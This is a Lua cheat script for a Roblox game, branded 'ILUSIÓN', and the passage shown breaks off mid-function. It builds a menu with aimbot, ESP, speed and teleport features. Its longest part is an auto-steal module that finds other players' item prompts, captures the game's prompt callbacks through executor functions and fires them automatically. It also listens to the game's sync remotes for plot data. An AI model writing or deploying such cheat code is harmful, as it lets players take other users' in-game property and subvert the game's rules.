--[[
 ILUSIÓN — Full Menu
 Tab 1 Player: Anti Gummy/Ragdoll/Paintball/Boogie + Speed 3-mode (Vis S2 loop)
 + Tool Aimbot + Drop Jump/Stand + Insta V1/V2 + TP Down keybinds
 Tab 2 ESP: Player ESP + Tracker + Anti Lag (Vis logic)
 Tab 3 Settings: Mobile 3-mode buttons, Lock/Unlock, shape Box/Round/Square,
 per-button size +/-, Reset Mobile / Reset All
 Close menu: nút − | Open: mini kéo được | NO keybind to open/close
]]

repeat task.wait() until game:IsLoaded()
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local TS = game:GetService("TweenService")
local RS = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local LP = Players.LocalPlayer
if not LP then
	repeat task.wait() until Players.LocalPlayer
	LP = Players.LocalPlayer
end
local PlayerGui = LP:WaitForChild("PlayerGui", 30) or LP:FindFirstChild("PlayerGui") or game:GetService("CoreGui")

pcall(function()
	for _, n in ipairs({
 "IlusionFullMenu", "IlusionFullMini", "IlusionModeBar", "IlusionActionButtons", "IlusionIntro", "IlusionIntro",
	}) do
 local g = PlayerGui:FindFirstChild(n)
 if g then g:Destroy() end
	end
end)

----------------------------------------------------------------
-- ILUSIÓN INTRO: centered title for 3 seconds, then load the interface
----------------------------------------------------------------
do
 local introGui = Instance.new("ScreenGui")
 introGui.Name = "IlusionIntro"
 introGui.IgnoreGuiInset = true
 introGui.ResetOnSpawn = false
 introGui.DisplayOrder = 1000000
 introGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 introGui.Parent = PlayerGui
 local shade = Instance.new("Frame")
 shade.Name = "Background"
 shade.Size = UDim2.fromScale(1, 1)
 shade.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 shade.BackgroundTransparency = 0.18
 shade.BorderSizePixel = 0
 shade.Parent = introGui
 local title = Instance.new("TextLabel")
 title.Name = "Title"
 title.AnchorPoint = Vector2.new(0.5, 0.5)
 title.Position = UDim2.fromScale(0.5, 0.5)
 title.Size = UDim2.new(0.8, 0, 0, 76)
 title.BackgroundTransparency = 1
 title.Text = "ILUSIÓN"
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.TextStrokeColor3 = Color3.fromRGB(55, 55, 55)
 title.TextStrokeTransparency = 0.15
 title.Font = Enum.Font.GothamBlack
 title.TextScaled = true
 title.Parent = shade
 local line = Instance.new("Frame")
 line.Name = "Underline"
 line.AnchorPoint = Vector2.new(0.5, 0)
 line.Position = UDim2.new(0.5, 0, 0.5, 45)
 line.Size = UDim2.new(0, 0, 0, 3)
 line.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 line.BorderSizePixel = 0
 line.Parent = shade
 pcall(function()
  TS:Create(line, TweenInfo.new(0.45, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0, 190, 0, 3)}):Play()
 end)
 task.wait(3)
 pcall(function() introGui:Destroy() end)
end

----------------------------------------------------------------
-- COLORS / STATE
----------------------------------------------------------------
local C = {
	-- Red Ilusión palette
	bg = Color3.fromRGB(28, 6, 8), bg2 = Color3.fromRGB(42, 10, 12),
	card = Color3.fromRGB(55, 14, 16), stroke = Color3.fromRGB(220, 40, 40),
	accent = Color3.fromRGB(255, 45, 45), text = Color3.fromRGB(255, 235, 235),
	textDim = Color3.fromRGB(200, 140, 140), on = Color3.fromRGB(255, 55, 55),
	off = Color3.fromRGB(40, 12, 14), box = Color3.fromRGB(48, 12, 14),
	danger = Color3.fromRGB(120, 20, 20),
	modeOnBg = Color3.fromRGB(255, 45, 45), modeOnTxt = Color3.fromRGB(30, 5, 5),
	modeOffBg = Color3.fromRGB(40, 12, 14), modeOffTxt = Color3.fromRGB(255, 235, 235),
	btnOn = Color3.fromRGB(255, 45, 45),
	btnOff = Color3.fromRGB(40, 12, 14),
}


-- Auto-write Vis Auto Steal for loadstring
pcall(function()
	if writefile then
 writefile("Ilusion_Auto_Steal_Embedded.lua", [==[--[[
 Auto Steal — full ILUSIÓN logic V1 / Semi V1-V2 / V3
]]
if _G.__VisAutoStealRunning then
	pcall(function()
 -- allow re-exec
	end)
end
_G.__VisAutoStealRunning = true

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")

local LP = Players.LocalPlayer
local PlayerGui = LP:WaitForChild("PlayerGui")

-- Shared state (must match ILUSIÓN names used in steal logic)
autoStealEnabled = false
selectedStealMode = "Normal"
autoStealRadius = 60
autoStealV1PausePercent = 75
autoStealV2Version = "V1"
_G.AceStealRadii = _G.AceStealRadii or { Normal = 60, Semi = 9, V3 = 60 }
_G.AceStealBarProgress = 0
_G.PulseAutoRadiusEnabled = false

local function saveAceConfig() end
setAutoStealVisual = nil

-- Minimal StealBar (progress only, no floating bar)
do
	local StealBar = {}
	function StealBar.SetProgress(p)
 _G.AceStealBarProgress = math.clamp(tonumber(p) or 0, 0, 1)
	end
	function StealBar.Reset()
 _G.AceStealBarProgress = 0
	end
	function StealBar.SetState(state)
 if tostring(state) == "SUCCESS" then
 _G.AceStealBarProgress = 1
 end
	end
	_G.StealBar = StealBar
end


-- AUTO STEAL — Normal/V1 = Galaxy Auto Steal V1 (hold → 75% → trigger)
-- ============================================================
-- ============================================================
-- AUTO STEAL — Normal/V1 = Pulse Normal V2 FULL logic
-- (thay Galaxy Auto Steal V1: radius hold + pause 75% + close-range finish)
-- ============================================================
_G.__AceSetupNormalAutoSteal = function()
 _G.AceNormalSteal = _G.AceNormalSteal or {}
 local A = _G.AceNormalSteal
 if A.conn then
 pcall(function()
 A.conn:Disconnect()
 end)
 A.conn = nil
 end
 if A.progressConn then
 pcall(function()
 A.progressConn:Disconnect()
 end)
 A.progressConn = nil
 end
 A.enabled = false
 A.isStealing = false
 A.stealStartTime = 0
 A.paused = false
 A.pauseStarted = nil
 A.pausedDuration = 0
 A.data = A.data or {}
 A.duration = 2.0
 A.radius = tonumber(autoStealRadius) or 62
 local function barSet(p, label)
 pcall(function()
 if _G.StealBar then
 _G.StealBar.SetState(label or "STEALING")
 _G.StealBar.SetProgress(math.clamp(tonumber(p) or 0, 0, 1))
 end
 end)
 end
 local function barReset()
 pcall(function()
 if _G.StealBar then
 _G.StealBar.Reset()
 end
 end)
 end
 local function getDetectedPlayerSpeed()
 local char = LP.Character
 local root = char and char:FindFirstChild("HumanoidRootPart")
 local hum = char and char:FindFirstChildOfClass("Humanoid")
 local speed = 0
 if root then
 local v = root.AssemblyLinearVelocity or root.Velocity
 speed = Vector3.new(v.X, 0, v.Z).Magnitude
 elseif hum then
 speed = hum.WalkSpeed or 0
 end
 if speed >= 40 then
 A.lastSpeed = speed
 end
 return A.lastSpeed or 62
 end
 local function getAutoGrabRadius()
 local r
 if _G.PulseAutoRadiusEnabled == true then
 r = math.clamp(getDetectedPlayerSpeed() + 1, 1, 500)
 else
 r = tonumber(autoStealRadius) or A.radius or 62
 end
 return math.clamp(r, 1, 500)
 end
 local function getAutoGrabPauseFraction()
 -- no pause by default: if _G.IlusionStealPause ~= true → treat as close-enough always (100%)
 if _G.IlusionStealPause ~= true then
 return 1.0 -- full 0-100 without waiting
 end
 local pct = tonumber(autoStealV1PausePercent) or 75
 pct = math.clamp(pct, 1, 99)
 return pct / 100
 end
 local function isMyPlotByName(plotName)
 local plots = workspace:FindFirstChild("Plots")
 if not plots then
 return false
 end
 local plot = plots:FindFirstChild(plotName)
 if not plot then
 return false
 end
 local sign = plot:FindFirstChild("PlotSign")
 if sign then
 local yb = sign:FindFirstChild("YourBase")
 if yb and yb:IsA("BillboardGui") then
 return yb.Enabled == true
 end
 local frame = sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame")
 local label = frame and frame:FindFirstChild("TextLabel")
 if label then
 local owner = label.Text:gsub("'s [Bb]ase$", ""):gsub("%s+$", "")
 if LP.DisplayName and owner == LP.DisplayName then
 return true
 end
 if LP.Name and owner == LP.Name then
 return true
 end
 end
 end
 return false
 end
 local function findNearestPrompt()
 local char = LP.Character
 if not char then
 return nil
 end
 local root = char:FindFirstChild("HumanoidRootPart")
 if not root then
 return nil
 end
 local plots = workspace:FindFirstChild("Plots")
 if not plots then
 return nil
 end
 local activeRadius = getAutoGrabRadius()
 local nearest, dist = nil, math.huge
 for _, plot in ipairs(plots:GetChildren()) do
 if not isMyPlotByName(plot.Name) then
 local pods = plot:FindFirstChild("AnimalPodiums")
 if pods then
 for _, pod in ipairs(pods:GetChildren()) do
 local base = pod:FindFirstChild("Base")
 local sp = base and base:FindFirstChild("Spawn")
 if sp then
 local d = (sp.Position - root.Position).Magnitude
 if d <= activeRadius and d < dist then
 local att = sp:FindFirstChild("PromptAttachment")
 local prompts = {}
 if att then
 for _, prompt in ipairs(att:GetChildren()) do
 if prompt:IsA("ProximityPrompt") then table.insert(prompts, prompt) end
 end
 end
 if sp then
 for _, obj in ipairs(sp:GetDescendants()) do
 if obj:IsA("ProximityPrompt") then table.insert(prompts, obj) end
 end
 end
 for _, prompt in ipairs(prompts) do
 local act = tostring(prompt.ActionText or ""):lower()
 local ok = act:find("steal", 1, true) or act:find("steal", 1, true) or act:find("steal", 1, true)
 or act:find("grab", 1, true) or act:find("take", 1, true) or act == ""
 if ok or prompt.Enabled then
 nearest, dist = prompt, d
 end
 end
 end
 end
 end
 end
 end
 end
 return nearest
 end
 local function executeSteal(prompt)
 if A.isStealing then
 return
 end
 if not prompt then
 return
 end
 if not A.data[prompt] then
 A.data[prompt] = { hold = {}, trigger = {}, ready = true }
 if getconnections then
 local okHold, holds = pcall(getconnections, prompt.PromptButtonHoldBegan)
 if okHold and type(holds) == "table" then
 for _, c in ipairs(holds) do
 if c.Function then
 table.insert(A.data[prompt].hold, c.Function)
 end
 end
 end
 local okTrig, triggers = pcall(getconnections, prompt.Triggered)
 if okTrig and type(triggers) == "table" then
 for _, c in ipairs(triggers) do
 if c.Function then
 table.insert(A.data[prompt].trigger, c.Function)
 end
 end
 end
 end
 end
 local data = A.data[prompt]
 if not data.ready then
 return
 end
 data.ready = false
 A.isStealing = true
 A.stealStartTime = tick()
 A.paused = false
 A.pauseStarted = nil
 A.pausedDuration = 0
 barSet(0, "STEALING")
 local targetPart = prompt:FindFirstAncestorWhichIsA("BasePart")
 local restarting = false
 local pauseFraction = (function()
 if _G.IlusionStealPause == true or (St and St.stealPause == true) then
 return math.clamp(((St and St.stealPausePct) or 75) / 100, 0.3, 0.95)
 end
 return 1 -- không pause: full 0→100 liên tục
 end)()
 local finishFraction = 1 - pauseFraction
 local function modeStillActive()
 return A.enabled and (selectedStealMode == "Normal" or selectedStealMode == "V1") and A.isStealing
 end
 local function isTargetInCurrentRadius()
 local char = LP.Character
 local root = char and char:FindFirstChild("HumanoidRootPart")
 local radius = getAutoGrabRadius()
 return root
 and targetPart
 and targetPart.Parent
 and (root.Position - targetPart.Position).Magnitude <= radius
 end
 local function isCloseEnoughToGrab()
 -- Stand gần brainrot / cột (prompt Steal hiện) → cho lên 100%
 local char = LP.Character
 local root = char and char:FindFirstChild("HumanoidRootPart")
 if not root or not targetPart or not targetPart.Parent then
 return false
 end
 local closeRange = 10
 pcall(function()
 if prompt and prompt.Parent then
 local mad = tonumber(prompt.MaxActivationDistance)
 if mad and mad > 0 then
 closeRange = math.max(mad, 8)
 end
 end
 end)
 closeRange = math.clamp(closeRange, 6, 15)
 return (root.Position - targetPart.Position).Magnitude <= closeRange
 end
 local function canStillGrab()
 -- Nới rất rộng khi đang steal — tránh reset sớm 60-80%
 if not prompt or not prompt.Parent then
 return false
 end
 if not targetPart or not targetPart.Parent then
 return prompt.Parent ~= nil
 end
 local char = LP.Character
 local root = char and char:FindFirstChild("HumanoidRootPart")
 if not root then return true end
 local radius = getAutoGrabRadius()
 local extra = math.max(radius * 1.5, 80) -- nới mạnh, không reset giữa chừng
 local d = (root.Position - targetPart.Position).Magnitude
 return d <= (radius + extra)
 end
 local function restartFromZero()
 if restarting then
 return
 end
 restarting = true
 A.paused = false
 A.pauseStarted = nil
 A.pausedDuration = 0
 if A.progressConn then
 A.progressConn:Disconnect()
 A.progressConn = nil
 end
 barReset()
 data.ready = true
 A.isStealing = false
 end
 if A.progressConn then
 A.progressConn:Disconnect()
 end
 A.progressConn = RunService.Heartbeat:Connect(function()
 if not A.isStealing then
 if A.progressConn then
 A.progressConn:Disconnect()
 A.progressConn = nil
 end
 return
 end
 if not A.enabled or (selectedStealMode ~= "Normal" and selectedStealMode ~= "V1") then
 restartFromZero()
 return
 end
 -- Chỉ abort nếu prompt biến mất; giữ bar + steal khi còn hold brainrot
 if not prompt or not prompt.Parent then
 restartFromZero()
 return
 end
 if not canStillGrab() then
 -- quá xa thật sự mới pause, không reset về 0 ngay
 if not A.paused then
 A.paused = true
 A.pauseStarted = tick()
 end
 elseif A.paused then
 A.pausedDuration = (A.pausedDuration or 0) + (tick() - (A.pauseStarted or tick()))
 A.paused = false
 A.pauseStarted = nil
 end
 local pf = getAutoGrabPauseFraction()
 if A.paused then
 barSet(pf, "STEALING")
 return
 end
 local elapsed = tick() - A.stealStartTime - (A.pausedDuration or 0)
 barSet(math.clamp(elapsed / (A.duration or 2.0), 0, pf), "STEALING")
 end)
 task.spawn(function()
 -- Fire hold callbacks
 for _, fn in ipairs(data.hold) do
 task.spawn(function() pcall(fn) end)
 end
 -- Luôn thử native hold + fireproximityprompt (V1 fix khi getconnections rỗng)
 pcall(function()
 if prompt.InputHoldBegin then prompt:InputHoldBegin() end
 end)
 if fireproximityprompt then
 pcall(function()
 fireproximityprompt(prompt)
 end)
 pcall(function()
 fireproximityprompt(prompt, 1)
 end)
 end
 if #data.hold == 0 and #data.trigger == 0 then
 pcall(function()
 if fireproximityprompt then
 fireproximityprompt(prompt, A.duration or 1.3)
 end
 end)
 end
 local dur = tonumber(A.duration) or 2.0
 local holdStart = tick()
 local wasAbleToGrab = false

 -- Đã đứng sẵn ở cột (≤2 stud): steal NORMAL full 0 → 100%
 if isCloseEnoughToGrab() or (not (_G.IlusionStealPause == true or (St and St.stealPause == true))) then
 -- No pause / đang sát cột: full 0→100, chỉ hủy nếu prompt mất / quá xa
 while tick() - holdStart < dur do
 if not modeStillActive() or not canStillGrab() then
 restartFromZero()
 return
 end
 local p = math.clamp((tick() - holdStart) / dur, 0, 1)
 barSet(p, "STEALING")
 if p >= 0.999 then break end
 task.wait()
 end
 barSet(1, "STEALING")
 wasAbleToGrab = true
 else
 -- Ngoài cột: chỉ lên 75% rồi giữ
 while tick() - holdStart < dur * pauseFraction do
 if not modeStillActive() or not canStillGrab() then
 restartFromZero()
 return
 end
 -- Trong lúc tụ 75%, nếu bước vào cột → chuyển normal lên 100%
 if isCloseEnoughToGrab() then
 local cur = math.clamp((tick() - holdStart) / dur, 0, pauseFraction)
 local remainStart = tick()
 local remainDur = dur * (1 - cur)
 while tick() - remainStart < remainDur do
 if not modeStillActive() or not canStillGrab() or not isCloseEnoughToGrab() then
 restartFromZero()
 return
 end
 local p = cur + (1 - cur) * math.clamp((tick() - remainStart) / remainDur, 0, 1)
 barSet(p, "STEALING")
 task.wait()
 end
 barSet(1, "STEALING")
 wasAbleToGrab = true
 break
 end
 local p = math.clamp((tick() - holdStart) / dur, 0, pauseFraction)
 barSet(p, "STEALING")
 task.wait()
 end

 if not wasAbleToGrab then
 barSet(pauseFraction, "STEALING") -- ngoài cột: đứng 75%
 A.paused = true
 A.pauseStarted = tick()
 -- Wait lại gần cột/brainrot → tăng 75% → 100% như normal
 while modeStillActive() do
 if not canStillGrab() then
 restartFromZero()
 return
 end
 if isCloseEnoughToGrab() then
 wasAbleToGrab = true
 break
 end
 task.wait()
 end
 if not modeStillActive() or not canStillGrab() then
 restartFromZero()
 return
 end
 if wasAbleToGrab then
 A.pausedDuration = (A.pausedDuration or 0) + (tick() - (A.pauseStarted or tick()))
 A.paused = false
 A.pauseStarted = nil
 local finishStart = tick()
 local finishDur = dur * (1 - pauseFraction)
 while tick() - finishStart < finishDur do
 if not modeStillActive() or not canStillGrab() or not isCloseEnoughToGrab() then
 restartFromZero()
 return
 end
 local fp = pauseFraction + (1 - pauseFraction) * math.clamp((tick() - finishStart) / finishDur, 0, 1)
 barSet(fp, "STEALING")
 task.wait()
 end
 barSet(1, "STEALING")
 end
 end
 end

 if wasAbleToGrab then
 -- bar 100% + fire steal thật
 A.paused = false
 A.pauseStarted = nil
 barSet(1, "STEALING")
 for _, fn in ipairs(data.trigger) do
 task.spawn(fn)
 end
 if fireproximityprompt then
 pcall(function() fireproximityprompt(prompt, A.duration or 1.3) end)
 pcall(function() fireproximityprompt(prompt, 1) end)
 pcall(function() fireproximityprompt(prompt) end)
 end
 pcall(function()
 if firesignal then
 pcall(firesignal, prompt.Triggered)
 end
 end)
 pcall(function()
 if _G.AutoCarrySpeed and _G.AutoCarrySpeed.WatchPickup then
 _G.AutoCarrySpeed.WatchPickup(1.25)
 end
 end)
 if A.progressConn then
 A.progressConn:Disconnect()
 A.progressConn = nil
 end
 barSet(1, "SUCCESS")
 -- 100% → 0 NGAY lập tức
 _G.AceStealBarProgress = 0
 barReset()
 if _G.StealBar and _G.StealBar.Reset then pcall(_G.StealBar.Reset) end
 data.ready = true
 A.isStealing = false
 A.paused = false
 A.pauseStarted = nil
 A.pausedDuration = 0
 -- micro-yield rồi Heartbeat sẽ pick target lại ngay
 task.defer(function()
 if not A.enabled then return end
 if A.isStealing then return end
 local t2 = findNearestPrompt and findNearestPrompt()
 if t2 then
 pcall(executeSteal, t2)
 end
 end)
 else
 -- No pause: vẫn reset 0 ngay để đầy lại
 barReset()
 data.ready = true
 A.isStealing = false
 restartFromZero()
 end
 end)
 end
 _G.AceNormalAutoStealSetRadius = function(v)
 local n = tonumber(v)
 if n then
 A.radius = n
 end
 end
 _G.AceNormalAutoStealStop = function()
 A.enabled = false
 A.isStealing = false
 A.paused = false
 A.pauseStarted = nil
 A.pausedDuration = 0
 if A.conn then
 A.conn:Disconnect()
 A.conn = nil
 end
 if A.progressConn then
 A.progressConn:Disconnect()
 A.progressConn = nil
 end
 barReset()
 end
 _G.AceNormalAutoStealStart = function()
 A.radius = tonumber(autoStealRadius) or A.radius or 62
 A.duration = 1.3
 A.enabled = true
 if A.conn then
 A.conn:Disconnect()
 A.conn = nil
 end
 A.conn = RunService.Heartbeat:Connect(function()
 if not A.enabled then
 return
 end
 if (selectedStealMode ~= "Normal" and selectedStealMode ~= "V1") then
 _G.AceNormalAutoStealStop()
 return
 end
 if A.isStealing then
 return
 end
 local target = findNearestPrompt()
 if target then
 executeSteal(target)
 end
 end)
 end
 _G.AceNormalAutoStealSync = function()
 if (selectedStealMode == "Normal" or selectedStealMode == "V1") and autoStealEnabled then
 _G.AceNormalAutoStealStart()
 else
 _G.AceNormalAutoStealStop()
 end
 end
end
_G.__AceSetupNormalAutoSteal()

_G.__AceSetupSemiAutoSteal = function()
	_G.AceSemiSteal = _G.AceSemiSteal or {}
	local A = _G.AceSemiSteal
	if A.conn then pcall(function() A.conn:Disconnect() end); A.conn = nil end
	A.enabled = false
	A.holdMin = 1.3
	A.holdMax = 2.6
	A.entryDelay = 0.05
	A.cooldown = 0
	A.primeRange = 100
	A.radius = math.clamp(tonumber(autoStealRadius) or 10, 1, 100)
	A.conn = A.conn
	A.scanThread = A.scanThread
	A.plotSync = A.plotSync or {caches = {}, connections = {}}
	A.animals = A.animals or {}
	A.promptCache = A.promptCache or {}
	A.internalCache = A.internalCache or {}
	A.state = A.state or {active = false, startTime = 0, phase = "idle", label = "", lastResult = "", lastResultTime = 0}
	local function barSet(p, label)
 pcall(function()
 if _G.StealBar then
 _G.StealBar.SetState(label or "STEALING")
 _G.StealBar.SetProgress(math.clamp(tonumber(p) or 0, 0, 1))
 end
 end)
	end
	local function barReset()
 pcall(function()
 if _G.StealBar then _G.StealBar.Reset() end
 end)
	end
	local function rootPart()
 local char = LP.Character
 return char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso")) or nil
	end
	local function splitPath(path)
 if typeof(path) == "table" then return path end
 local out = {}
 for part in string.gmatch(tostring(path), "[^%.]+") do
 table.insert(out, tonumber(part) or part)
 end
 return out
	end
	local function resolvePath(path, root)
 local current, parent, key = root, nil, nil
 for _, part in ipairs(splitPath(path)) do
 parent = current
 key = part
 current = current and current[part] or nil
 end
 return current, parent, key
	end
	local function applySyncDiff(channelName, packet)
 local cache = A.plotSync.caches[channelName]
 if typeof(cache) ~= "table" then return end
 local path, action, a, b = packet[1], packet[2], packet[3], packet[4]
 local current, parent, key = resolvePath(path, cache)
 if action == "Changed" then
 if parent ~= nil then parent[key] = a end
 elseif action == "ArrayInsert" then
 if current ~= nil then table.insert(current, b, a) end
 elseif action == "ArrayRemoved" then
 if current ~= nil then table.remove(current, b) end
 elseif action == "DictionaryInsert" then
 if current ~= nil then current[b] = a end
 elseif action == "DictionaryRemoved" then
 if current ~= nil then current[b] = nil end
 end
	end
	local function attachPlotChannel(remote, plots, requestData)
 if A.plotSync.connections[remote] then return end
 local channelName = tostring(remote.Name)
 if not plots:FindFirstChild(channelName) then return end
 if requestData and A.plotSync.caches[channelName] == nil then
 local ok, data = pcall(function() return requestData:InvokeServer(channelName) end)
 A.plotSync.caches[channelName] = (ok and typeof(data) == "table") and data or {}
 elseif A.plotSync.caches[channelName] == nil then
 A.plotSync.caches[channelName] = {}
 end
 A.plotSync.connections[remote] = remote.OnClientEvent:Connect(function(queue)
 for _, packet in ipairs(queue) do applySyncDiff(channelName, packet) end
 end)
	end
	local function ensureSync()
 if A.syncReady then return true end
 local ok = pcall(function()
 local rs = game:GetService("ReplicatedStorage")
 A.packages = rs:WaitForChild("Packages", 10)
 A.datas = rs:WaitForChild("Datas", 10)
 A.plots = workspace:WaitForChild("Plots", 10)
 if not (A.packages and A.datas and A.plots) then return end
 A.animalsData = require(A.datas:WaitForChild("Animals", 10))
 local sync = A.packages:WaitForChild("Synchronizer", 10)
 A.channelFolder = sync:WaitForChild("Channel", 10)
 A.routeRemote = sync:FindFirstChild("CommunicationRoute")
 A.requestData = sync:FindFirstChild("RequestData")
 for _, child in ipairs(A.channelFolder:GetChildren()) do
 if child:IsA("RemoteEvent") then attachPlotChannel(child, A.plots, A.requestData) end
 end
 A.channelFolder.ChildAdded:Connect(function(child)
 if child:IsA("RemoteEvent") then attachPlotChannel(child, A.plots, A.requestData) end
 end)
 A.routeRemote.OnClientEvent:Connect(function(actions)
 for _, action in ipairs(actions) do
 local kind, channelName = action[1], tostring(action[2])
 if A.plots and A.plots:FindFirstChild(channelName) then
 if kind == "ListenerAdded" then
 local remote = A.channelFolder and A.channelFolder:FindFirstChild(channelName)
 if remote and remote:IsA("RemoteEvent") then attachPlotChannel(remote, A.plots, A.requestData) end
 elseif kind == "ListenerRemoved" then
 for remote, conn in pairs(A.plotSync.connections) do
 if tostring(remote.Name) == channelName then
 pcall(function() conn:Disconnect() end)
 A.plotSync.connections[remote] = nil
 A.plotSync.caches[channelName] = nil
 break
 end
 end
 end
 end
 end
 end)
 A.syncReady = true
 end)
 return ok and A.syncReady == true
	end
	local function getPlotOwner(plot)
 local sign = plot and plot:FindFirstChild("PlotSign")
 local frame = sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame")
 local label = frame and frame:FindFirstChild("TextLabel")
 if not label or label.Text == "Empty Base" then return nil end
 return label.Text:gsub("'s [Bb]ase$", ""):gsub("%s+$", "")
	end
	local function isMyBaseAnimal(animalData)
 if not animalData or not animalData.plot or not A.plots then return false end
 local plot = A.plots:FindFirstChild(animalData.plot)
 if not plot then return false end
 local owner = getPlotOwner(plot)
 return owner == LP.DisplayName or owner == LP.Name
	end
	local function podiumFor(animalData)
 local plot = A.plots and A.plots:FindFirstChild(animalData.plot)
 local podiums = plot and plot:FindFirstChild("AnimalPodiums")
 return podiums and podiums:FindFirstChild(animalData.slot) or nil
	end
	local function animalPos(animalData)
 local podium = podiumFor(animalData)
 return podium and podium:GetPivot().Position or nil
	end
	local function distToAnimal(animalData)
 local root = rootPart()
 local pos = animalPos(animalData)
 return root and pos and (root.Position - pos).Magnitude or math.huge
	end
	local function findPromptForAnimal(animalData)
 if not animalData then return nil end
 local cached = A.promptCache[animalData.uid]
 if cached and cached.Parent then return cached end
 local podium = podiumFor(animalData)
 local base = podium and podium:FindFirstChild("Base")
 local spawn = base and base:FindFirstChild("Spawn")
 if not spawn then return nil end
 local function isStealPrompt(prompt)
 if not prompt or not prompt:IsA("ProximityPrompt") then return false end
 if prompt.Enabled == false then return false end
 local act = tostring(prompt.ActionText or ""):lower()
 if act:find("collect", 1, true) or act:find("collect", 1, true)
 or act:find("collect", 1, true) or act:find("claim", 1, true) then
 return false
 end
 if act:find("steal", 1, true) or act:find("steal", 1, true)
 or act:find("steal", 1, true) or act:find("grab", 1, true)
 or act:find("take", 1, true) or act == "" then
 return true
 end
 return false
 end
 local attach = spawn:FindFirstChild("PromptAttachment")
 local best = nil
 if attach then
 for _, prompt in ipairs(attach:GetChildren()) do
 if isStealPrompt(prompt) then
 best = prompt
 break
 end
 end
 end
 if not best then
 for _, obj in ipairs(spawn:GetDescendants()) do
 if isStealPrompt(obj) then
 best = obj
 break
 end
 end
 end
 if best then
 A.promptCache[animalData.uid] = best
 end
 return best
	end
	local function scanAllPlots()
 if not ensureSync() then return 0 end
 local newCache = {}
 for _, plot in ipairs(A.plots:GetChildren()) do
 local cache = A.plotSync.caches[plot.Name]
 local animalList = cache and cache.AnimalList
 if typeof(animalList) == "table" then
 for slot, animalData in pairs(animalList) do
 if type(animalData) == "table" then
 local animalName = animalData.Index
 local info = A.animalsData and A.animalsData[animalName]
 if info then
 table.insert(newCache, {
 name = info.DisplayName or animalName,
 plot = plot.Name,
 slot = tostring(slot),
 uid = plot.Name .. "_" .. tostring(slot),
 })
 end
 end
 end
 end
 end
 A.animals = newCache
 return #newCache
	end
	local function pickClosest()
 local root = rootPart()
 if not root then return nil end
 local best, bestDist = nil, math.huge
 for _, animalData in ipairs(A.animals) do
 if not isMyBaseAnimal(animalData) then
 local pos = animalPos(animalData)
 local dist = pos and (root.Position - pos).Magnitude or math.huge
 if dist <= (A.primeRange or 80) and dist < bestDist then
 best, bestDist = animalData, dist
 end
 end
 end
 return best
	end
	local function buildCallbacks(prompt)
 if not prompt then
 return
 end
 local existing = A.internalCache[prompt]
 if existing and (#(existing.holdCallbacks or {}) > 0 or #(existing.triggerCallbacks or {}) > 0) then
 return
 end
 local data = {holdCallbacks = {}, triggerCallbacks = {}, ready = true}
 if getconnections then
 local okHold, holds = pcall(getconnections, prompt.PromptButtonHoldBegan)
 if okHold and type(holds) == "table" then
 local idx, conn
 for idx, conn in ipairs(holds) do
 if conn.Function then
 data.holdCallbacks[#data.holdCallbacks + 1] = conn.Function
 end
 end
 end
 local okTrigger, triggers = pcall(getconnections, prompt.Triggered)
 if okTrigger and type(triggers) == "table" then
 local idx, conn
 for idx, conn in ipairs(triggers) do
 if conn.Function then
 data.triggerCallbacks[#data.triggerCallbacks + 1] = conn.Function
 end
 end
 end
 end
 A.internalCache[prompt] = data
	end
	local function executeSemi(prompt, animalData)
 -- Auto Steal V2 Version 2 = FULL BloodHounds (message.txt) logic
 if not prompt or not prompt.Parent or not animalData then
 return false
 end
 buildCallbacks(prompt)
 local data = A.internalCache[prompt]
 if not data then
 data = {holdCallbacks = {}, triggerCallbacks = {}, ready = true}
 A.internalCache[prompt] = data
 end
 if not data.ready then
 return false
 end
 -- refresh callbacks like BloodHounds buildStealCallbacks
 if getconnections then
 local hold, trig = {}, {}
 local ok1, conns1 = pcall(getconnections, prompt.PromptButtonHoldBegan)
 if ok1 and type(conns1) == "table" then
 for _, conn in ipairs(conns1) do
 if type(conn.Function) == "function" then
 hold[#hold + 1] = conn.Function
 end
 end
 end
 local ok2, conns2 = pcall(getconnections, prompt.Triggered)
 if ok2 and type(conns2) == "table" then
 for _, conn in ipairs(conns2) do
 if type(conn.Function) == "function" then
 trig[#trig + 1] = conn.Function
 end
 end
 end
 if #hold > 0 or #trig > 0 then
 data.holdCallbacks = hold
 data.triggerCallbacks = trig
 end
 end

 local function barSet(p, label)
 p = math.clamp(tonumber(p) or 0, 0, 1)
 _G.AceStealBarProgress = p
 pcall(function()
 if _G.StealBar and _G.StealBar.SetProgress then
 _G.StealBar.SetProgress(p)
 end
 end)
 pcall(function()
 if _G.StealBar and _G.StealBar.SetState and label then
 _G.StealBar.SetState(label)
 end
 end)
 end
 local function barReset()
 _G.AceStealBarProgress = 0
 pcall(function()
 if _G.StealBar and _G.StealBar.SetProgress then
 _G.StealBar.SetProgress(0)
 end
 end)
 pcall(function()
 if _G.StealBar and _G.StealBar.SetState then
 _G.StealBar.SetState("IDLE")
 end
 end)
 end

 local HOLD_MIN = tonumber(A.holdMin) or 1.3
 local HOLD_MAX = tonumber(A.holdMax) or 2.6
 local ENTRY_DELAY = tonumber(A.entryDelay) or 0.3
 local STEAL_RANGE = math.clamp(tonumber(A.radius) or tonumber(autoStealRadius) or 9, 1, 100)
 local COOLDOWN = tonumber(A.cooldown) or 0.05
 local ver = (autoStealV2Version == "V2") and "V2" or "V1"

 data.ready = false
 A.state.active = true
 A.state.startTime = tick()
 A.state.phase = "holding"
 A.state.label = animalData.name or "Animal"

 task.spawn(function()
 local label = A.state.label
 local startTime = A.state.startTime
 local fired = false

 -- ========== V2 = FULL BloodHounds executeStealAsync ==========
 if ver == "V2" then
 -- Phase 1: fire all holdCallbacks, wait HOLD_MIN (bar 0→1 over HOLD_MAX window)
